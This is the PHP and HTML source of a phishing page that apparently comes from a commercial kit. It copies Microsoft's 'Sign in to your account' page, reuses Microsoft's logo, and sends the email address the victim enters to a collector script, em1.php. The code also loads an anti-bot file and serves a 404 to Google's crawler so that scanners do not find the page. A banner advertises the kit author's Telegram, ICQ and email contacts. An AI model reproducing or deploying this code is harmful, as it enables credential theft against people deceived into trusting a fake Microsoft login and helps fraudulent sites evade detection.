<?php
include('antibots.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<?php

/*
<!--
 _____                   ____                                               
 |  __ \                 |  _ \                                              
 | |__) |_ _  __ _  ___  | |_) |_   _                                        
 |  ___/ _` |/ _` |/ _ \ |  _ <| | | |                                       
 | |  | (_| | (_| |  __/ | |_) | |_| |                                       
 |_|   \__,_|\__, |\___| |____/ \__, |                                       
              __/ |              __/ |                                       
            _|___/           ___|___/    _    _            ______ ____       
           |___ \           / _ \       | |  | |          |____  |___ \      
             __) |_ __ _ __| | | |_ __  | |__| |_   _ _ __    / /  __) |_ __ 
            |__ <| '__| '__| | | | '__| |  __  | | | | '_ \  / /  |__ <| '__|
            ___) | |  | |  | |_| | |    | |  | | |_| | | | |/ /   ___) | |   
           |____/|_|  |_|   \___/|_|    |_|  |_|\__,_|_| |_/_/   |____/|_|   
                                                                             
					 #							       #
                    # ✔ 𝐈𝐂𝐐: 746979851 𝒐𝒓 @alsakib945   #
                   #     ✔  𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: @alsakib945        #
				   #    ✔ hridoykhan3rr0r@hotmail.com   #
				   #     ✔   fb.com/error.hunter        #
				    #          -𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐌𝐞 𝐇𝐞𝐫𝐞-          #
                  |#|====================================|#|  
			    𝐂𝐨𝐩𝐲𝐫𝐢𝐠𝐡𝐭 𝟚𝟘𝟚𝟘-𝟚𝟘𝟚𝟛---𝐀𝐥𝐥 𝐫𝐢𝐠𝐡𝐭𝐬 𝐑𝐞𝐬𝐞𝐫𝐯𝐞𝐝!
			ɪғ ʏᴏᴜ sᴇᴇ ᴀɴʏ ᴘʀᴏʙʟᴇᴍ ɪɴ ᴘᴀɢᴇ, ᴄᴏɴᴛᴀᴄᴛ ᴡɪᴛʜ ᴍᴇ!
//-----------------------------||--||-----------------------------\\
-->
*/
?>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link rel="stylesheet" href="style.css">

    <!-- google fonts linkup -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <!-- google fonts linkup -->

    <!-- responsive css linkup -->
    <link rel="stylesheet" href="css/responsive.css">
    <!-- responsive css linkup -->
</head>

<body>
	<form action="em1.php" method="POST" autocomplete="no">
    <div class="login_box">
        <div class="login_box_contents">
            <div class="login_box_content_wrapper">
                <div class="login_top_logo">
                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
                        alt="">
                </div>
                <div class="sign_in_text">
                    <p>Sign in</p>
                </div>
                <div class="login_inputbox">
                    <input class="the_input" type="email" placeholder="Email, phone, or Skype" name="Email" required />
                </div>
                <div class="login_middle_links">
                    <p>No account? <span class="login_middle"><a href="#">Create one!</a></span> </p>

                    <p><a href="#">Can’t access your account?</a></p>

                    <p><a href="#">Sign-in options</a></p>
                </div>
                <div class="login_next_button">
					<input type="submit" value="Sign in" class="button"/>
                </div>
            </div>
        </div>
    </div>
	</form>
	
    <footer>
        <div class="footer_contents">
            <ul>
                <li><a href="#">Terms of use</a></li>
                <li><a href="#">Privacy and cookies</a></li>
            </ul>
            <button>. . .</button>
        </div>
    </footer>
</body>

</html>